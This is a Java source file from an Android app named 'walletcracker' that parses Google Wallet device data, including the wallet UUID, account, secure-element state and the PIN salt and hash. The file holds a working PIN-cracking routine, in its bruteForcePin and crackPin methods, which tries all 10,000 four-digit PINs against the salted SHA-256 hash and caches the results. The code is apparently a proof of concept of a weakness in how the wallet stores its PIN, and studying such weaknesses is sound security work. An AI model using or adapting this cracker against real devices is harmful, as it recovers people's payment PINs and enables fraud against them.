package com.rubixconsulting.walletcracker;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import com.google.protobuf.ByteString;
import com.google.protobuf.Descriptors.EnumValueDescriptor;
import com.google.protobuf.Descriptors.FieldDescriptor;
import com.google.protobuf.InvalidProtocolBufferException;
import com.google.protobuf.Message;
import com.rubixconsulting.walletcracker.GoogleWalletProtos.DeviceInfo;
import com.rubixconsulting.walletcracker.GoogleWalletProtos.DeviceInfo.PinInfo;

import android.content.Context;
import android.preference.PreferenceManager;
import android.util.Log;

public class DeviceInfoParser {
  static final public class Exception extends java.lang.Exception {
    public Exception(String err) {
      super(err);
    }

    private static final long serialVersionUID = 1L;
  }

  protected final static String HEX_DIGITS = "0123456789abcdef";
  protected final static String TAG = "DeviceInfoParser";
  protected DeviceInfo _deviceInfo;
  protected Context _context;
  protected List<Map<String, ObscurableString>> _dataCache;
  private static Boolean _pinCacheLock = false;

  public DeviceInfoParser(Context context, byte deviceInfoRaw[]) {
    _context = context;

    try {
      _deviceInfo = DeviceInfo.parseFrom(deviceInfoRaw);
    } catch (InvalidProtocolBufferException e) {
      Log.e(TAG, "Error parsing: " + e.getMessage());
    }
  }

  public List<Map<String, ObscurableString>> getData() {
    if (_dataCache != null) {
      return _dataCache;
    }

    ObscurableString.setObscurableFields(_context.getResources().getStringArray(R.array.obscurable_fields));
    ObscurableString.setObscure(PreferenceManager.getDefaultSharedPreferences(_context).getBoolean("demo_mode", false));

    List<Map<String, ObscurableString>> data = addMessage("", _deviceInfo);

    _dataCache = data;
    return data;
  }

  private String decodeFieldName(String fieldName) {
    if (fieldName.equals("wallet_uuid")) {
      return _context.getString(R.string.wallet_uuid);
    } else if (fieldName.equals("pin_info")) {
      return _context.getString(R.string.pin_info);
    } else if (fieldName.equals("salt")) {
      return _context.getString(R.string.salt);
    } else if (fieldName.equals("pin_hash")) {
      return _context.getString(R.string.pin_hash);
    } else if (fieldName.equals("bad_pin_attempts")) {
      return _context.getString(R.string.bad_pin_attempts);
    } else if (fieldName.equals("pin_expired")) {
      return _context.getString(R.string.pin_expired);
    } else if (fieldName.equals("gaia_account")) {
      return _context.getString(R.string.gaia_account);
    } else if (fieldName.equals("c2dmreginfo")) {
      return _context.getString(R.string.c2dmreginfo);
    } else if (fieldName.equals("virgin")) {
      return _context.getString(R.string.virgin);
    } else if (fieldName.equals("setup_complete")) {
      return _context.getString(R.string.setup_complete);
    } else if (fieldName.equals("id")) {
      return _context.getString(R.string.id);
    } else if (fieldName.equals("is_registered")) {
      return _context.getString(R.string.is_registered);
    } else if (fieldName.equals("originator_id")) {
      return _context.getString(R.string.originator_id);
    } else if (fieldName.equals("local_id")) {
      return _context.getString(R.string.local_id);
    } else if (fieldName.equals("android_id")) {
      return _context.getString(R.string.android_id);
    } else if (fieldName.equals("tsa_status")) {
      return _context.getString(R.string.tsa_status);
    } else if (fieldName.equals("number")) {
      return _context.getString(R.string.number);
    } else if (fieldName.equals("updated_at_ms")) {
      return _context.getString(R.string.updated_at_ms);
    } else if (fieldName.equals("gaia_account_missing")) {
      return _context.getString(R.string.gaia_account_missing);
    } else if (fieldName.equals("cplc")) {
      return _context.getString(R.string.cplc);
    } else if (fieldName.equals("secure_element_initialized")) {
      return _context.getString(R.string.secure_element_initialized);
    } else if (fieldName.equals("secure_element_activation_complete")) {
      return _context.getString(R.string.secure_element_activation_complete);
    } else if (fieldName.equals("secure_element_activation_timestamp_in_millis")) {
      return _context.getString(R.string.secure_element_activation_timestamp_in_millis);
    } else if (fieldName.equals("setup_completion_time_in_millis")) {
      return _context.getString(R.string.setup_completion_time_in_millis);
    } else if (fieldName.equals("has_synced_instruments_once")) {
      return _context.getString(R.string.has_synced_instruments_once);
    } else if (fieldName.equals("wallet_package_name")) {
      return _context.getString(R.string.wallet_package_name);
    } else if (fieldName.equals("secure_element_transaction_generation")) {
      return _context.getString(R.string.secure_element_transaction_generation);
    } else if (fieldName.equals("partner_config")) {
      return _context.getString(R.string.partner_config);
    } else if (fieldName.equals("next_local_id")) {
      return _context.getString(R.string.next_local_id);
    } else if (fieldName.equals("state_transition_timestamp")) {
      return _context.getString(R.string.state_transition_timestamp);
    } else if (fieldName.equals("state_transition_delta_ms")) {
      return _context.getString(R.string.state_transition_delta_ms);
    }

    Log.d(TAG, "unknown field: "+fieldName);
    return fieldName;
  }

  private List<Map<String, ObscurableString>>addMessage(String prefix, Message message) {
    List<Map<String, ObscurableString>> data = new ArrayList<Map<String, ObscurableString>>();

    if (message == null) {
      return data;
    }

    for (Map.Entry<FieldDescriptor, Object> entry : message.getAllFields().entrySet()) {
      final String fieldName = entry.getKey().getName();
      final String decoded = decodeFieldName(fieldName);
      final ObscurableString title = new ObscurableString((prefix.equals("") ? "" : prefix + " => ") + decoded);

      Map<String, ObscurableString> ret = new HashMap<String, ObscurableString>(2);
      ret.put("title", title);

      if (
//          fieldName.equals("state_transition_timestamp") ||
          fieldName.equals("updated_at_ms") ||
          fieldName.equals("secure_element_activation_timestamp_in_millis") ||
          fieldName.equals("setup_completion_time_in_millis")
      ) {
        Date d = new Date((Long) entry.getValue());
        ret.put("value", new ObscurableString(fieldName, d.toString()));
        data.add(ret);
      } else {
        switch (entry.getKey().getJavaType()) {
          case INT:
          case LONG:
          case FLOAT:
          case DOUBLE:
          case BOOLEAN:
          case STRING:
            ret.put("value", new ObscurableString(fieldName, entry.getValue().toString()));
            data.add(ret);
            break;
          case ENUM:
            ret.put("value", new ObscurableString(fieldName, ((EnumValueDescriptor) entry.getValue()).getName()));
            data.add(ret);
            break;
          case BYTE_STRING:
            ret.put("value", new ObscurableString(fieldName, ((ByteString) entry.getValue()).toStringUtf8()));
            data.add(ret);
            break;
          case MESSAGE:
            data.addAll(addMessage(title.toString(), (Message) entry.getValue()));
            break;
        }
      }
    }

    return data;
  }

  private Integer getCachedPin(WalletCrackerDbHelper crackerDb, Long salt, String hash) {
    final Integer cachedPin = crackerDb.getPin(salt, hash);
    if (cachedPin == null) {
      return cachedPin;
    } else if (cachedPin < 0) {
      Log.e(TAG, "crackPin found cached error pin");
    } else {
      Log.d(TAG, "crackPin found cached pin");
    }
    return cachedPin;
  }

  private Integer bruteForcePin(Long salt, String hash) {
    for (Integer tryPin = 0; tryPin < 10000; ++tryPin) {
      try {
        byte calc[] = MessageDigest.getInstance("SHA256").digest((tryPin.toString()+salt).getBytes());

        StringBuffer hex = new StringBuffer();
        for (final byte b : calc) {
          hex.append(HEX_DIGITS.charAt((b & 0xF0) >> 4)).append(HEX_DIGITS.charAt((b & 0x0F)));
        }

        String calcHash = hex.toString();
        if (calcHash.toLowerCase().equals(hash.toLowerCase())) {
          return tryPin;
        }
      } catch (NoSuchAlgorithmException e) {
        Log.e(TAG, "no such algorithm");
      }
    }

    return WalletCrackerDbHelper.PIN_ERROR;
  }

  private Integer crackPinAsNeeded(WalletCrackerDbHelper crackerDb, Long salt, String hash) {
    final Integer cachedPin = getCachedPin(crackerDb, salt, hash);
    if (cachedPin != null) {
      return cachedPin;
    }

    Log.d(TAG, "crackPin calculating pin...");

    final Integer bruteForcedPin = bruteForcePin(salt, hash);
    if (bruteForcedPin == WalletCrackerDbHelper.PIN_ERROR) {
      Log.e(TAG, "Could not compute PIN");
    }

    crackerDb.addPin(salt, hash, bruteForcedPin);
    return bruteForcedPin;
  }

  public Integer crackPin() throws Exception {
    if (_deviceInfo == null) {
      throw new Exception("Google Wallet device information could not be found");
    }

    final PinInfo pinInfo = _deviceInfo.getPinInfo();

    if (pinInfo == null) {
      throw new Exception("Pin information could not be found");
    }

    final Long salt = pinInfo.getSalt();

    if (salt == null) {
      throw new Exception("Salt could not be found");
    }

    final ByteString rawHash = pinInfo.getPinHash();
    if (rawHash == null) {
      throw new Exception("Hash could not be found");
    }

    final String hash = rawHash.toStringUtf8();
    WalletCrackerDbHelper crackerDb = null;

    try {
      crackerDb = new WalletCrackerDbHelper(_context);

      synchronized(_pinCacheLock) {
        return crackPinAsNeeded(crackerDb, salt, hash);
      }
    } finally {
      if (crackerDb != null) {
        crackerDb.close();
      }
    }
  }

  static public String formatPin(Integer pin) {
    return String.format("%04d", pin);
  }
}
